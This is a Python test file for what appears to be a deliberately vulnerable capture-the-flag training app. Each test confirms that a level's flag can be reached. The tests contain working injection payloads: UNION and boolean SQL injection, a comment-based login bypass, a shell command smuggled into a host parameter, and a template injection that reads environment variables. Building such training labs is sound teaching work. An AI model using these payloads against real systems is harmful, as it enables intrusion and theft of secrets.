import sqlite3
import urllib.parse

import deadwood.levels  # noqa: F401  (registers every level)
from deadwood import data
from deadwood.level import TIERS, Request, all_levels, by_slug


def _req(query):
    return Request("GET", "/x?" + urllib.parse.urlencode(query), {}, b"", ("127.0.0.1", 0))


def _db_for(lv):
    db = sqlite3.connect(":memory:")
    data.build(db)
    lv.seed(db)
    return db


def test_registry_is_coherent():
    levels = all_levels()
    assert len(levels) >= 4
    slugs = [lv.slug for lv in levels]
    nums = [lv.num for lv in levels]
    assert len(set(slugs)) == len(slugs)            # slugs unique
    assert len(set(nums)) == len(nums)              # numbers unique
    assert nums == sorted(nums)                      # ordered
    for lv in levels:
        assert lv.title and lv.slug and lv.category
        assert lv.objective and lv.hints and lv.remediation and lv.source
        assert lv.tier in TIERS


def test_first_blood_union_reaches_the_flag(monkeypatch, tmp_path):
    monkeypatch.setenv("XDG_DATA_HOME", str(tmp_path))
    lv = by_slug("first-blood")
    db = _db_for(lv)
    assert b"<b>" in lv.handle(_req({"id": "1"}), db).body         # normal lookup reflects a name
    out = lv.handle(_req({"id": "0 UNION SELECT 1,label,value FROM secrets"}), db).body
    assert lv.flag().encode() in out                              # the flag is reachable via UNION


def test_whispers_has_a_boolean_differential(monkeypatch, tmp_path):
    monkeypatch.setenv("XDG_DATA_HOME", str(tmp_path))
    lv = by_slug("whispers")
    db = _db_for(lv)
    true_page = lv.handle(_req({"user": "admin' AND '1'='1"}), db).body
    false_page = lv.handle(_req({"user": "admin' AND '1'='2"}), db).body
    assert b"Welcome back" in true_page
    assert b"Invalid login" in false_page


def test_back_door_command_injection_leaks_the_flag(monkeypatch, tmp_path):
    monkeypatch.setenv("XDG_DATA_HOME", str(tmp_path))
    lv = by_slug("back-door")
    db = _db_for(lv)
    out = lv.handle(_req({"host": "x; echo $DEADWOOD_FLAG"}), db).body
    assert lv.flag().encode() in out


def test_the_bouncer_auth_bypass(monkeypatch, tmp_path):
    monkeypatch.setenv("XDG_DATA_HOME", str(tmp_path))
    lv = by_slug("the-bouncer")
    db = _db_for(lv)
    denied = lv.handle(_req({"user": "admin", "pass": "guess"}), db).body
    assert b"Access denied" in denied
    bypass = lv.handle(_req({"user": "admin'-- -", "pass": "x"}), db).body
    assert lv.flag().encode() in bypass                          # comment out the password check


def test_sleight_of_hand_filtered_union(monkeypatch, tmp_path):
    monkeypatch.setenv("XDG_DATA_HOME", str(tmp_path))
    lv = by_slug("sleight-of-hand")
    db = _db_for(lv)
    # the catalog is blocked
    assert b"blocked" in lv.handle(_req({"id": "1 UNION SELECT name,1,2 FROM sqlite_master"}), db).body
    # but a quote-free, by-name UNION still reaches the flag
    out = lv.handle(_req({"id": "0 UNION SELECT 1,label,value FROM secrets"}), db).body
    assert lv.flag().encode() in out


def test_the_cipher_ssti_reads_the_flag(monkeypatch, tmp_path):
    monkeypatch.setenv("XDG_DATA_HOME", str(tmp_path))
    lv = by_slug("the-cipher")
    db = _db_for(lv)                                             # seed() puts the flag in the env
    payload = "{{__import__('os').environ['DEADWOOD_CIPHER']}}"
    assert lv.flag().encode() in lv.handle(_req({"name": payload}), db).body
